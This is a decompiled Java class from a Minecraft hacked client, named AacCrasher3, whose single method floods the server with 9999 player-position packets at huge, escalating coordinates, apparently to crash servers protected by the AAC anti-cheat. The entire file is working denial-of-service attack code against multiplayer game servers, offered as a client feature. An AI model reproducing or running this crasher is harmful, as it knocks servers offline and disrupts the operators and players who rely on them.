// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.aac;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.client.Minecraft;

public class AacCrasher3
{
    public static void start() {
        for (int index2 = 0; index2 < 9999; ++index2) {
            Minecraft.getMinecraft().getConnection().sendPacket(new CPacketPlayer.Position(Minecraft.getMinecraft().player.posX + 9412 * index2, Minecraft.getMinecraft().player.getEntityBoundingBox().minY + 9412 * index2, Minecraft.getMinecraft().player.posZ + 9412 * index2, true));
        }
    }
}
